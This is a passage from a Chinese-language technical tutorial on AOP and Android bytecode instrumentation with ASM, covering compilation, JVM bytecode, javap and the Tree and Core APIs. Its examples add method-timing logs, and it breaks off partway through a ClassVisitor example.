<p>简单来说，OOP 帮我们把系统拆分成了很多个“垂直”的模块（<code>User</code> 模块、<code>Order</code> 模块...）。每个模块各司其职，管理好自己的数据和业务逻辑即可。</p>
<p>这在绝大多数情况下都是 OK 的，但总有一些“不合群”的逻辑，它们很难被归类到某一个具体的业务模块里。假设产品经理要求我们为这两个（将来可能还有几百个）方法添加耗时监控。</p>
<p>不借助 AOP 我们很可能会这么写：</p>
<pre><code class="hljs language-diff" lang="diff">open class Person(val name: String) {
  fun eat() {
<span class="hljs-addition">+   val startTime = System.currentTimeMillis()</span>
    println("$name 正在吃饭...")
    Thread.sleep(100) // 模拟吃饭耗时
<span class="hljs-addition">+   val duration = System.currentTimeMillis() - startTime</span>
<span class="hljs-addition">+   Log.d("PERF", "eat() 耗时: ${duration}ms")</span>
  }
}

class Student(name: String, val studentId: String) : Person(name) {
  fun study() {
<span class="hljs-addition">+   val startTime = System.currentTimeMillis()</span>
    println("$name 正在学习...")
    Thread.sleep(200) // 模拟学习耗时
<span class="hljs-addition">+   val duration = System.currentTimeMillis() - startTime</span>
<span class="hljs-addition">+   Log.d("PERF", "study() 耗时: ${duration}ms")</span>
  }
}
</code></pre>
<p>“耗时监控”这个功能，它并不属于 <code>Person</code> / <code>Student</code> 的核心业务，但它却像牛皮癣一样，侵入并散落在了各个业务模块中。这导致了：</p>
<ol>
<li>代码重复：每个方法里都有一套几乎一样的模板代码。</li>
<li>维护困难：如果现在想把日志从 <code>Log.d</code> 改成上报到服务器，得去修改所有地方。</li>
<li>逻辑污染：<code>eat</code> 方法的核心职责本应只是“吃”，现在却被迫“关心”自己是如何被监控的。</li>
</ol>
<p>如果把面向对象 OOP 想象成盖大楼，<code>Person</code> 是 1 楼，<code>Student</code> 是 2 楼...（同一片土地上还有各种其他大楼） 它们都是“垂直”的功能单元。那么“性能监控”、“日志打印”、“权限校验”这些功能，就像是大楼的“水电”或“消防”系统。它们需要“横跨”所有楼层，贯穿到每一个房间。这种“横跨”多个“垂直”模块的通用功能，就被称为 “横切关注点”（Cross-Cutting Concerns）。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/808756289efc462ba3c1b700db79acf2~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgYnFsaWFuZw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764558339&amp;x-signature=hjUOrjDGi8l2r5eu8XJK10pwr8M%3D" alt="AOP_2.png" loading="lazy"/></p>
<p>而 AOP 的核心思想，就是把这些“横切关注点”从业务逻辑中“抽离”出去，实现关注点分离。</p>
<p>AOP 允许我们将这些“横切逻辑”定义在一个独立的地方，这个地方就叫“切面”（Aspect），它就像是整栋大楼的“集中式配电箱”或“日志中心”。然后我们还需要再定义一个“规则”（比如“所有以 <code>load</code> 开头的方法”或“所有被 <code>@LogTime</code> 注解的方法”），AOP 框架就会自动把这个“切面”里的逻辑“织入”到符合规则的那些“关键点”（比如方法执行前 / 后）。</p>
<hr/>
<p>如果你写过 Python，里面的装饰器（Decorator）就是 AOP 思想的一个直观体现。</p>
<p>假设我们要实现“打印方法耗时”这个切面逻辑，用Python 装饰器来实现很简单：</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># 这是一个“装饰器”，它本质上是一个函数 (log_time)</span>
<span class="hljs-comment"># 它接收另一个函数 (func) 作为参数，并返回一个新的“包装后”的函数 (wrapper)</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">log_time</span>(<span class="hljs-params">func</span>):  <span class="hljs-comment"># 参数 func 为被装饰的函数  </span>
  <span class="hljs-keyword">def</span> <span class="hljs-title function_">wrapper</span>(<span class="hljs-params">*args, **kwargs</span>):      
    start = time.perf_counter()  <span class="hljs-comment"># 记录开始时间</span>
    
    result = func(*args, **kwargs)  <span class="hljs-comment"># 调用被装饰的函数, 即原始的业务逻辑函数</span>
    
    end = time.perf_counter()  <span class="hljs-comment"># 记录结束时间</span>
    cost = (end - start) * <span class="hljs-number">1000</span>  <span class="hljs-comment"># 计算耗时，单位毫秒</span>
    <span class="hljs-built_in">print</span>(<span class="hljs-string">f'execute <span class="hljs-subst">{func.__name__}</span> took <span class="hljs-subst">{cost:<span class="hljs-number">.4</span>f}</span> ms'</span>) <span class="hljs-comment"># 打印耗时</span>
    <span class="hljs-keyword">return</span> result  <span class="hljs-comment"># 返回结果</span>
  
  <span class="hljs-keyword">return</span> wrapper  <span class="hljs-comment"># 返回包装函数</span>
  
  
<span class="hljs-meta">@log_time </span><span class="hljs-comment"># 语法糖，这等价于: add = log_time(add), 切面逻辑在这里被"织入"</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">a, b</span>):
  <span class="hljs-keyword">return</span> a + b
  
  
<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">'__main__'</span>:  
  <span class="hljs-built_in">print</span>(add(<span class="hljs-number">1</span>, <span class="hljs-number">2</span>)) <span class="hljs-comment"># 调用时，执行的已经是被 "wrapper" 包装过的函数了</span>

<span class="hljs-comment"># 输出：</span>
<span class="hljs-comment"># execute add took 0.0008 ms</span>
<span class="hljs-comment"># 3</span>
</code></pre>
<p>通过装饰器，我们的业务方法 <code>add()</code> 内部保留了纯粹的业务逻辑。它对自己被“监控”这件事完全无感知，是 AOP 框架（这里指 Python 的装饰器语法）在外部帮我们完成了“织入”工作。</p>
<hr/>
<h3 data-id="heading-3">AOP 与“插桩”的关系</h3>
<ul>
<li>
<p><strong>AOP (面向切面)：</strong> 一种<strong>编程思想</strong>，目的是解耦“核心业务”和“横切关注点”。</p>
</li>
<li>
<p><strong>插桩 (Instrumentation)：</strong> 实现 AOP 思想的一种主要<strong>技术手段</strong>（即在特定点插入探针代码）。</p>
</li>
<li>
<p><strong>ASM：</strong> 一个（在 Java/Kotlin 领域）用来执行“插桩”的<strong>具体工具</strong>，能直接操作字节码。</p>
</li>
</ul>
<p>在 Java/Kotlin 领域，我们没有 Python 装饰器那么灵活的语法。为了在不修改业务代码的前提下，实现 AOP 切面编程，把“切面”逻辑（比如权限检查、耗时统计）“织入”到业务方法中，我们最好的办法就是在编译期去修改 <code>.class</code> 文件的字节码。而 ASM 就是一个能方便修改字节码的工具，它能找到目标方法（比如 <code>loadUserData</code>），在它的字节码开头和结尾，“插入”用于计时的“桩”（也就是那些 <code>startTime</code> 和 <code>Log.d</code> 对应的字节码指令）。</p>
<h2 data-id="heading-4">什么是 ASM</h2>
<p>ASM 是一个通用的 Java 字节码操作和分析框架。它允许你动态地读取、修改和生成 Java 字节码（<code>.class</code> 文件）。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/832580e3cded40ffa714ba673aadae1d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgYnFsaWFuZw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764558339&amp;x-signature=tBab8ZmEVQL7%2BFuzxMYgaVZgL6c%3D" alt="ASM_can_do.png" loading="lazy"/></p>
<h2 data-id="heading-5">前置知识</h2>
<p>基础不牢，地动山摇。</p>
<p>既然 ASM 是用来修改字节码（<code>.class</code> 文件）的，那么我们肯定得先了解 <code>.class</code> 文件是在哪个阶段生成的，以及字节码的格式。</p>
<p>如果不知道 <code>.class</code> 文件何时生成，我们就不知道去哪里“拦截”它；如果不知道字节码格式，那么即使文件摆在面前，我们也无从下手修改。</p>
<h3 data-id="heading-6">Java 编译过程</h3>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/756095ef5bd14631998ee92233d3e341~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgYnFsaWFuZw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764558339&amp;x-signature=hJUdIa4BiMy%2FuTVAzXrxiwbqQuU%3D" alt="How Compilation Works in Java.png" loading="lazy"/></p>
<p>我们写的 java 代码是放在 <code>.java</code> 文件里，这些文件会经过 Javac 被编译成字节码（Bytecode）也就是 <code>.class</code> 文件，执行时 <code>.class</code> 文件经由 JVM 虚拟机被翻译成机器码。</p>
<h3 data-id="heading-7">Android 打包流程</h3>
<p>再来看看 apk 的打包流程：</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c171b01eec35454089953e030e659b12~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgYnFsaWFuZw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764558339&amp;x-signature=%2FlfmkyuLG4ZpqlQZaxDna9tAtrg%3D" alt="Android 打包流程.png" loading="lazy"/></p>
<ol>
<li>
<p>aapt2 编译资源生成 <code>R.java</code> 和 resources.arsc；</p>
</li>
<li>
<p>kotlinc/javac 编译源码 <code>.kt</code>/<code>.java</code> 生成 <code>.class</code> 文件；</p>
</li>
<li>
<p>R8 (或 d8) 对 <code>.class</code> 文件进行混淆、优化，并转换为 <code>.dex</code> 文件；</p>
</li>
<li>
<p>apkbuilder 将 .dex、.arsc、AndroidManifest.xml 等所有文件打包成一个未签名的 <code>.apk</code> (ZIP 包)；</p>
</li>
<li>
<p>jarsigner 使用私钥对 APK 进行签名，生成可安装的 APK 文件；</p>
</li>
<li>
<p>zipalign 对 APK 包进行内存对齐优化；</p>
</li>
</ol>
<blockquote>
<p>我在网上搜上面的流程图，找到最早的一张是 11 年前，彼时 2014 年还是 Android 4.4w 和 Android 5.0 Lollipop 的时代，而我还在读初中。</p>
<p>时过境迁，Android 的打包流程也在变化，dex 编译器从 dx 到 d8 再到 r8。其次，在 Android 7.0+ 后，必须改用 V2+ 签名，打包时必须先 Zipalign 对齐再 Apksigner 签名，也就是上面最后两个步骤互相调换。</p>
</blockquote>
<p>话扯远了，本文主要是讨论 ASM 修改字节码，我们只需要知道，在 apk 打包过程中，javac / kotlinc 编译器工作后、DEX 编译器工作前，就是我们修改字节码进行插桩的时机。</p>
<h3 data-id="heading-8">初识字节码</h3>
<p>为了认识字节码，我们首先写一个简单的 <code>add()</code> 函数：</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// Utils.kt</span>
<span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">add</span><span class="hljs-params">(a: <span class="hljs-type">Int</span>, b: <span class="hljs-type">Int</span>)</span></span> {
  <span class="hljs-keyword">return</span> a + b
}
</code></pre>
<blockquote>
<p>我们可以在 IDE 里直接通过 Tools -&gt; Kotlin -&gt; Show Kotlin Bytecode 来方便地查看文件对应的字节码，不过为了能让大家对整个过程有更好的认识，所以下面会一步一步手敲命令。</p>
</blockquote>
<p>我们先用 kotlinc 将其编译为 <code>.class</code> 文件，因为 Kotlinc 是与 IDE 捆绑的，在我的机器上，路径是：
<code>C:\Program Files\Android\Android Studio\plugins\Kotlin\kotlinc\bin\kotlinc</code></p>
<p>我们先切换（<code>cd</code>）到 Kotlin 编译器的 bin 目录：</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-built_in">cd</span> <span class="hljs-string">'C:\Program Files\Android\Android Studio\plugins\Kotlin\kotlinc\bin'</span>
</code></pre>
<p>然后使用 <code>kotlinc xxx.kt</code> 命令编译 <code>.kt</code> 文件：</p>
<pre><code class="hljs language-bash" lang="bash">.\kotlinc Utils.kt -d KotlinBytecode
</code></pre>
<blockquote>
<p>这里建议加上 -d 指定输出目录</p>
</blockquote>
<pre><code class="hljs language-scss" lang="scss">│
└─KotlinBytecode
    ├─com
    │  └─example
    │      └─helloworld (对应的包路径)
    │              UtilsKt<span class="hljs-selector-class">.class</span>
    │
    └─META-INF (包含模块信息)
            <span class="hljs-selector-tag">main</span><span class="hljs-selector-class">.kotlin_module</span>
</code></pre>
<p>因为 <code>add()</code> 函数直接写在 <code>Utils.kt</code> 文件里，Kotlin 默认会在文件名后面加上 <code>Kt</code> 来生成类，我们最终得到的就是 <code>UtilsKt.class</code> 文件。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a7063563750046cc912ff7effb47a508~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgYnFsaWFuZw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764558339&amp;x-signature=fOX49V7XDKOOzkAOE5%2FB50nfLJQ%3D" alt="hex.png" loading="lazy"/></p>
<blockquote>
<p><code>.class</code> 文件是二进制文件，里面是遵循《Java虚拟机规范》特定格式编码的机器指令（称为字节码，Bytecode）和其他元数据。需要使用专门的工具（如十六进制编辑器或 <code>javap</code> 反汇编器）才能查看其内容。
<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1f387b7b5cd04423983cc65189d40f52~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgYnFsaWFuZw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764558339&amp;x-signature=t9r1jWp21L979DBgrylNS5YK3Oc%3D" alt="class file overview.png" loading="lazy"/></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/de3b519fee8e45218207b0723e7167f7~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgYnFsaWFuZw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764558339&amp;x-signature=BaoUHePqB4OZo4Qir5SuK0p2Xl0%3D" alt="ClassFile 结构.png" loading="lazy"/>
比如，<code>.class</code> 文件格式规范规定，每个 <code>.class</code> 文件的开头都必须是被称为 “魔数”（Magic Number）的固定四个字节。这个魔数是 <code>0xCAFEBABE</code>（16 进制表示）。</p>
</blockquote>
<p>即使用 16 进制编辑器打开 <code>.class</code> 文件，也非常难以阅读和理解，想要以更直观的方式阅读 <code>.class</code> 文件，可以利用 JDK 自带 <code>javap</code>（Java Class File Disassembler）工具，它用于反汇编 <code>.class</code> 文件，是查看字节码的标准工具。</p>
<p>我们先 cd 到 <code>.class</code> 文件的所在目录，然后使用 <code>javap</code> 命令：</p>
<pre><code class="hljs language-bash" lang="bash">javap -c .\UtilsKt.class
</code></pre>
<p><code>-c</code>（disassemble code）参数表示查看字节码指令</p>
<p>执行命令会我们就会得到以下内容：</p>
<pre><code class="hljs language-arduino" lang="arduino">Compiled from <span class="hljs-string">"Utils.kt"</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">com</span>.example.helloworld.UtilsKt {
  <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-type">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> <span class="hljs-title">add</span><span class="hljs-params">(<span class="hljs-type">int</span>, <span class="hljs-type">int</span>)</span></span>;
    Code:
       <span class="hljs-number">0</span>: iload_0
       <span class="hljs-number">1</span>: iload_1
       <span class="hljs-number">2</span>: iadd
       <span class="hljs-number">3</span>: ireturn
}
</code></pre>
<p>要理解上面的字节码指令，我们首先得理解栈帧，每个线程都有一个独立的栈，每调用一个方法，就会往这个栈放入一个栈帧（栈是一个后进先出的结构，所以调用最深方法的栈帧处在栈顶）：</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/143fbac509754494abe210e5ffcd56ec~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgYnFsaWFuZw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764558339&amp;x-signature=JX76hEpMkWmxgOkgHvoXeInCzBs%3D" alt="栈帧.png" loading="lazy"/></p>
<p>每个栈帧都存储着：</p>
<ul>
<li><strong>局部变量表</strong>；</li>
<li><strong>操作数栈</strong>；</li>
<li>动态链接；</li>
<li>方法返回地址；</li>
</ul>
<p>我们再把 <code>javap</code> 的输出贴一遍：</p>
<pre><code class="hljs language-arduino" lang="arduino"><span class="hljs-keyword">public</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">com</span>.example.helloworld.UtilsKt {
  <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-type">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> <span class="hljs-title">add</span><span class="hljs-params">(<span class="hljs-type">int</span>, <span class="hljs-type">int</span>)</span></span>;
    Code:
       <span class="hljs-number">0</span>: iload_0
       <span class="hljs-number">1</span>: iload_1
       <span class="hljs-number">2</span>: iadd
       <span class="hljs-number">3</span>: ireturn
}
</code></pre>
<p>局部变量表像一个数组，用于存储方法参数和方法内部定义的局部变量，对于我们的 <code>add()</code> 方法，局部变量表为：<code>[ 0: a, 1: b ]</code> (索引 0 存的是参数 <code>a</code>，索引 1 存的是参数 <code>b</code>)</p>
<blockquote>
<p>如果是非静态方法，局部变量表的索引 0 位置是 class 实例，也就是 <code>this</code>。</p>
</blockquote>
<p>操作数栈 (Operand Stack) 是一个后进先出 (LIFO) 的栈，用于执行计算。字节码指令（比如 iadd）会从这个栈中弹出 (pop) 数据，计算后，再把结果压入 (push) 栈顶。初始时操作数栈为空：<code>[ ]</code>。</p>
<p>接下来，我们来当一次 JVM，一步一步执行 <code>add(int, int)</code> 方法的字节码：</p>
<ol>
<li>
<p><code>iload_0</code></p>
<ul>
<li>含义: i 代表 integer (整数)，load 代表加载。0 是一个简写，代表索引 0。</li>
<li>动作: 从局部变量表的索引 0 处加载一个整数（也就是参数 a），并将其压入操作数栈。</li>
<li>栈帧状态：
<ul>
<li>局部变量表: <code>[ a, b ]</code></li>
<li>操作数栈: <code>[ a ]</code></li>
</ul>
</li>
</ul>
</li>
<li>
<p><code>iload_1</code>：与上一条字节码指令类似，不再赘述。</p>
<ul>
<li>栈帧状态：
<ul>
<li>局部变量表: <code>[ a, b ]</code></li>
<li>操作数栈: <code>[ a, b ]</code> (b 在栈顶)</li>
</ul>
</li>
</ul>
</li>
<li>
<p><code>iadd</code></p>
<ul>
<li>含义：<code>i</code> (integer) + <code>add</code> (相加)</li>
<li>动作: 从操作数栈顶部弹出两个整数（先弹出 <code>b</code>，再弹出 <code>a</code>），将它们相加，然后把结果（假设为 <code>c</code>） 压回操作数栈。</li>
<li>栈帧状态：
<ul>
<li>局部变量表：<code>[ a, b ]</code></li>
<li>操作数栈：<code>[ c ]</code></li>
</ul>
</li>
</ul>
</li>
<li>
<p><code>ireturn</code></p>
<ul>
<li>含义：<code>i</code> (integer) + <code>return</code> (返回)</li>
<li>动作：从操作数栈顶部弹出一个整数（也就是 a + b 的结果），并将其作为方法的返回值。同时，当前栈帧被销毁。</li>
<li>栈帧状态：被销毁</li>
</ul>
</li>
</ol>
<p>以上就是字节码的执行过程，就好像一套基于栈的底层汇编语言。<code>iload</code>、<code>iadd</code>、<code>ireturn</code> 这些被称为“助记符”，它们每一个都对应一个 16 进制的“操作码”（比如 <code>iload_0</code> 对应 <code>0x1a</code>）。<code>.class</code> 文件里存的就是这些二进制的操作码，而 <code>javap</code> 帮我们反编译成了更易读的助记符。</p>
<hr/>
<p>好了，截至目前为止，我们现在知道了：</p>
<ul>
<li>为什么插桩：为了实现 AOP，分离“横切关注点”；</li>
<li>插桩时机：在 <code>.class</code> 文件生成后，<code>.dex</code> 文件生成前；</li>
<li>插桩原理：修改 <code>.class</code> 文件的字节码指令。</li>
</ul>
<p>下一个问题是：怎么改？</p>
<p>我们总不能用 16 进制编辑器去手动修改 <code>.class</code> 文件吧？（较真起来可以是可以，但真没这个必要）我们需要一个更高级、更抽象的工具来帮我们解析和修改字节码。</p>
<p>市面上主流的字节码操作库有：</p>
<ul>
<li><strong>Javassist</strong>: 提供了更高级别的 API。支持用类似 Java 源码的字符串（如 <code>System.out.println("hello");</code>）来插入代码，它会帮你编译成字节码。上手简单，但灵活性和性能稍差。</li>
<li><strong>ASM</strong>: 提供了更底层的 API。它不认识 Java 源码，它只认识 <code>iload</code>、<code>iadd</code> 这样的字节码指令。需手动去“拼”出这些指令。更难，但性能高、灵活性强。</li>
</ul>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f4048c88ec1e4cfb95b9ff17a09955f7~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgYnFsaWFuZw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764558339&amp;x-signature=uydyAivXcAGyUHvuQ9nB2%2FjrDBw%3D" alt="ASM_and_Javassist.png" loading="lazy"/></p>
<p>在 Android 领域，ASM 几乎是唯一的选择。因为在 Android 打包过程中会遍历成百上千个 <code>.class</code> 文件。这个过程对性能的要求是极致的。ASM 几乎就是字节码的“搬运工”，非常的轻量，没有多余的抽象和转换。</p>
<h2 data-id="heading-9">ASM 是如何工作的？</h2>
<p>那么，相比于手动编辑 16 进制文件，ASM 是如何让我们优雅地修改 <code>.class</code> 文件的呢？</p>
<p>ASM 提供了两套 API 来操作字节码，它们各有优劣：</p>
<ol>
<li>
<p><strong>Tree API</strong>：面向对象的方式，先把整个 <code>.class</code> 文件的内容读入内存，构建成一个“树”状结构，我们通过操作这棵“树”的节点来修改字节码。</p>
</li>
<li>
<p><strong>Core API</strong>：基于事件流的方式，像 SAX 解析 XML 一样，逐行扫描 <code>.class</code> 文件，在扫描到特定结构（如“找到一个方法”、“找到一条指令”）时触发回调，我们在回调里进行修改。</p>
</li>
</ol>
<h3 data-id="heading-10">Tree API</h3>
<p>我们先从更容易理解的 Tree API 讲起。</p>
<p>相信在座的每个 Android 开发者都用过 Gson 解析 <code>.json</code> 文件：</p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"name"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"UtilsKt"</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"superName"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"java/lang/Object"</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"methods"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span> <span class="hljs-punctuation">{</span> <span class="hljs-attr">"name"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"add"</span><span class="hljs-punctuation">,</span> <span class="hljs-attr">"desc"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"(II)I"</span> <span class="hljs-punctuation">}</span> <span class="hljs-punctuation">]</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<p>使用 Gson 时，它会把整个 JSON 字符串读入内存，转换成一个 <code>JsonObject</code> 或对应的数据类。随后我们就可以像操作一个普通的 Kotlin/Java 对象一样，随意地读取、修改、添加或删除它的任何属性，比如 <code>jsonObject.remove("superName")</code>。</p>
<p>ASM 的 Tree API 也是完全一样的思路。由于<code>.class</code> 文件是一个遵循严格规范的二进制结构。Tree API 会把整个 <code>.class</code> 文件的字节流完整地读入内存，然后构建出一个完整的“对象树”来表示这个类。</p>
<p>还记得我们上面那个 <code>UtilsKt.class</code> 吗？如果用 Tree API 把它加载到内存里，结构大概是这个样子：</p>
<pre><code class="hljs language-lua" lang="lua">ClassNode (类: UtilsKt)
 |
 +<span class="hljs-comment">-- name: "UtilsKt" (由文件名 Utils.kt 自动生成)</span>
 |
 +<span class="hljs-comment">-- superName: "java/lang/Object"</span>
 |
 +<span class="hljs-comment">-- access: public final (公共且不可继承)</span>
 |
 +<span class="hljs-comment">-- fields (字段列表): (无)</span>
 |
 +<span class="hljs-comment">-- methods (方法列表):</span>
     |
     +<span class="hljs-comment">-- MethodNode (方法: &lt;init&gt;)</span>
     |   |
     |   +<span class="hljs-comment">-- access: private (私有构造函数，防止外部实例化)</span>
     |
     +<span class="hljs-comment">-- MethodNode (方法: add)</span>
         |
         +<span class="hljs-comment">-- access: public static final (公共、静态、最终)</span>
             |
             +<span class="hljs-comment">-- descriptor: "(II)I" (描述符：接收两个Int，返回一个Int)</span>
             |
             +<span class="hljs-comment">-- instructions (指令列表):</span>
                 |
                 +<span class="hljs-comment">-- InsnNode (指令: [ILOAD_0]) (加载第 0 个参数 'a' 到栈顶)</span>
                 +<span class="hljs-comment">-- InsnNode (指令: [ILOAD_1]) (加载第 1 个参数 'b' 到栈顶)</span>
                 +<span class="hljs-comment">-- InsnNode (指令: [IADD])    (将栈顶两个 Int 相加，结果放回栈顶)</span>
                 +<span class="hljs-comment">-- InsnNode (指令: [IRETURN]) (返回栈顶的 Int 结果)</span>
</code></pre>
<p>现在要对 <code>add()</code> 方法插入耗时统计的切面逻辑，我们要做的事情，就是去修改对应的 MethodNode 里的 instructions 列表。具体来说就是：</p>
<ol>
<li>在 <code>methodNode.instructions</code> 的最前面（insert）插入“获取开始时间并存入局部变量”的指令。</li>
<li>遍历 <code>methodNode.instructions</code>，找到所有“返回”指令（比如 <code>IRETURN</code>），在这些指令之前（insertBefore）插入“计算耗时并打印日志”的指令。</li>
</ol>
<blockquote>
<p>在这里先给各位新手打个预防针，“插入字节码”说起来容易，写起来做起来难。我们必须手动去“拼”出代码对应的所有字节码指令。
以 <code>val start = System.currentTimeMillis()</code> 为例，对应的字节码指令有两个：</p>
<ol>
<li><code>INVOKESTATIC java/lang/System.currentTimeMillis ()J</code>：调用静态方法，并将 <code>long</code> 类型的返回值压入操作数栈；</li>
<li><code>LSTORE_2</code>：将栈顶的 <code>long</code> 存入局部变量表的第 2 个槽位（第 0、1 个分别是 <code>a</code> 和 <code>b</code>）。</li>
</ol>
<p>而 <code>Log.d(...)</code> 这行代码则更为复杂，涉及 String 的拼接，对应的字节码指令有十几条（比如 <code>NEW</code>、<code>DUP</code>、<code>LDC</code>、<code>INVOKEVIRTUAL</code>...）除了要确保这些指令准确无误，还得手动管理好局部变量表和操作数栈的最大深度，因为没有修改前，这个方法的局部变量表只有 2 个槽位，操作数栈的最大深度是 2，但是插入了新的字节码后就不一样了，如果不修正局部变量表和操作数栈的最大深度，JVM 在校验 <code>.class</code> 文件时就会直接崩溃。</p>
</blockquote>
<blockquote>
<p>前面我们学会了用 <code>javap -c xxx.classs</code> 命令来查看 class 文件中的 Java 字节码指令，它会显示类中的所有方法以及每个方法对应的字节码指令列表。如果我们想查看 <code>.class</code> 文件的更多信息，可以使用 <code>-v</code> 参数（verbose），它会输出显示：类元数据、常量池、方法元数据（如堆栈大小、局部变量表大小、参数数量）等等所有详细信息。</p>
</blockquote>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/9a1d6e505564411f91907c647ee59cc9~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgYnFsaWFuZw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764558339&amp;x-signature=NtegTfj7VXVaY8kEAynyPw8uabM%3D" alt="javap-v.png" loading="lazy"/></p>
<p>这套 Tree API 的优点是直观，符合面向对象的思维。增删改查就像操作 <code>List</code> 一样简单，适合需要进行复杂、全局性修改的场景。缺点也很明显：内存黑洞，需要把 <code>.class</code> 文件的所有信息都加载到内存中。</p>
<p>一般情况下，我们是不会采用这这套 API 的，在 Android 的编译流程中，AGP 需要遍历成百上千个 <code>.class</code> 文件。如果每处理一个文件都要先把它们全部读入内存，构建成一个巨大的 ClassNode 对象树，然后再序列化回磁盘，内存占用和 I/O 开销将不容乐观，对本就漫长的编译过程无疑是雪上加霜。</p>
<h3 data-id="heading-11">Core API</h3>
<p>如果说 Tree API 是把整本书背下来再修改，那么 Core API 就是边读边改。</p>
<p>Core API 基于 Visitor Pattern（访问者模式），它本质上是一个事件驱动的模型（就像 XML 解析中的 SAX）。它不需要把整个类加载到内存里，而是通过“流”的形式，遍历 .class 文件，每遇到一个节点（类头、字段、方法、注解），就触发一个事件回调。</p>
<pre><code class="hljs language-mermaid" lang="mermaid">graph LR
    A[ClassReader] --&gt;|解析字节码| B(ClassVisitor 我们写的插桩逻辑)
    B --&gt;|修改/透传事件| C[ClassWriter]
    C --&gt;|生成字节码| D[新的.class文件]
</code></pre>
<p>它们的协作关系就像一条流水线，也就是责任链模式</p>
<p>怎么去理解这里面的“访问者模式”呢？你可以把这个过程想象成有一个导游（ClassReader）带领我们（ClassVisitor）参观房子（<code>.class</code>），除了之外，还有一个装修公司的负责人（ClassWriter）在旁边。</p>
<ol>
<li>
<p>ClassReader（导游）带我们走到主卧门口，开始念：“现在有一个方法，叫 add，参数是 2 个 int...”</p>
</li>
<li>
<p>ClassVisitor（访问者 / 游客）听到后，可以原封不动地传给 ClassWriter（装修公司的负责人），也可以夹带私货：“现在有一个方法，叫 add，参数是 3 个 int”</p>
</li>
<li>
<p>ClassWriter（装修公司的负责人）听到什么就记下来，最后拼成新的 <code>.class</code> 文件。</p>
</li>
</ol>
<p>假设我们要修改一个类，我们通常会继承 <code>ClassVisitor</code>：</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-keyword">class</span> <span class="hljs-title class_">MyClassVisitor</span>(nextVisitor: ClassVisitor) : ClassVisitor(Opcodes.ASM9, nextVisitor) {

  <span class="hljs-comment">// 访问到"类"</span>
  <span class="hljs-keyword">override</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">visit</span><span class="hljs-params">(version: <span class="hljs-type">Int</span>, access: <span class="hljs-type">Int</span>, name: <span class="hljs-type">String</span>?, signature: <span class="hljs-type">String</span>?, superName: <span class="hljs-type">String</span>?, interfaces: <span class="hljs-type">Array</span>&lt;<span class="hljs-type">out</span> <span class="hljs-type">String</span>&gt;?)</span></span> {
    <span class="hljs-comment">// 可以在这里修改类名、父类等</span>
